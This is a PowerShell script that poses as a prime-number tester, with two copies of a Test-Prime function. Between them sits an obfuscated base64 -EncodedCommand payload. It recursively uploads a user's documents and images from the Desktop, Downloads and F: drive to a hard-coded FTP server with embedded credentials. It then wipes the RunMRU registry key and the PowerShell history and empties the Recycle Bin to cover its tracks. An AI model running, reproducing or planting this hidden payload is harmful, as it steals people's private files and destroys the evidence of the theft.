function Test-Prime {
    param(
    [Parameter(ValueFromPipeline=$true)]
    $number
    )
    
   Process {
    $prime = $true;
    if ($number -isnot [int]) {$prime = $false}
    elseif ($number -le 0) {$prime = $false}
    else {
        if ($number -eq 1) {
            $prime = $false;
        }
        if ($number -gt 3) {
            $sqrt = [math]::Sqrt($number); 
            if ($sqrt -is [int]) {$prime = $false}
            else {
                for($i = 2; $i -le $sqrt; $i++) {
                    if ($number % $i -eq 0) {
                        $prime = $false;
                        break;
                    }
                }
            }
        }
    }
    return $prime;
}}

1..1000000 | %{ Write-Host " $_ $( Test-Prime $_)" }

powershell.exe -EncodedCommand "//4kAFcAZQBiAEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQADQAKA
CQARABpAHIAIAA9ACAAIgBDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAdQBzAGUAcgBuAGEAbQBlAFwAZABlAHMAawB0AG8AcAAiACwAIgBDADoAXABVAHMAZQ
ByAHMAXAAkAGUAbgB2ADoAdQBzAGUAcgBuAGEAbQBlAFwARABvAHcAbgBsAG8AYQBkAHMAIgAsACIARgA6AFwAIgANAAoAJABGAFQAUAAgAD0AIAAiAGYAdABwADo
ALwAvAHQAZQBzAHQAYQBkAG0AaQBuADoAdABlAHMAdABwAGEAcwBzAHcAbwByAGQAQAAxADkAMgAuADEAMQA5AC4ANwAxAC4AOAA5AC8AZgBpAGwAZQBzAC8AIgAN
AAoADQAKAA0ACgBmAG8AcgBlAGEAYwBoACgAJABpAHQAZQBtACAAaQBuACAAKABHAGUAdAAtAEMAaABpAGwAZABJAHQAZQBtACAAJABEAGkAcgAgAC0ASQBuAGMAb
AB1AGQAZQAgACoALgB0AHgAdAAsACoALgB4AGwAcwB4ACwAKgAuAHAAZABmACwAKgAuAHAAcAB0ACwAKgAuAGQAbwBjAHgALAAqAC4AagBwAGUAZwAsACoALgBqAH
AAZwAgAC0AUgBlAGMAdQByAHMAZQApACkAewANAAoAIAAgACAAIAAkAFUAUgBJACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFUAcgB
pACgAJABGAFQAUAArACQAaQB0AGUAbQAuAE4AYQBtAGUAKQANAAoAIAAgACAAIAAkAFcAZQBiAEMAbABpAGUAbgB0AC4AVQBwAGwAbwBhAGQARgBpAGwAZQAoACQA
VQBSAEkALAAgACQAaQB0AGUAbQAuAEYAdQBsAGwATgBhAG0AZQApAA0ACgB9AA0ACgANAAoAZgB1AG4AYwB0AGkAbwBuACAAQwBsAGUAYQBuAC0ARQB4AGYAaQBsA
HsADQAKACAAIAAgACAAcgBlAGcAIABkAGUAbABlAHQAZQAgAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQ
BjAHIAbwBzAG8AZgB0AFwAdwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEUAeABwAGwAbwByAGUAcgBcAFIAdQBuAE0AUgBVACA
ALwB2AGEAIAAvAGYADQAKACAAIAAgACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwByAGUAYQBkAGwAaQBuAGUATwBwAHQAaQBvAG4AKQAu
AEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoAA0ACgAgACAAIAAgAEMAbABlAGEAcgAtAFIAZQBjAHkAYwBsAGUAQgBpAG4AIAAtAEYAbwByAGMAZQAgAC0AR
QByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQANAAoAfQANAAoAQwBsAGUAYQBuAC0ARQB4AGYAaQBsAA=="

function Test {
    param(
    [Parameter(ValueFromPipeline=$true)]
    $number
    )
    
   Process {
    $prime = $true;
    if ($number -isnot [int]) {$prime = $false}
    elseif ($number -le 0) {$prime = $false}
    else {
        if ($number -eq 1) {
            $prime = $false;
        }
        if ($number -gt 3) {
            $sqrt = [math]::Sqrt($number); 
            if ($sqrt -is [int]) {$prime = $false}
            else {
                for($i = 2; $i -le $sqrt; $i++) {
                    if ($number % $i -eq 0) {
                        $prime = $false;
                        break;
                    }
                }
            }
        }
    }
    return $prime;
}}

1..1000000 | %{ Write-Host " $_ $( Test $_)" }

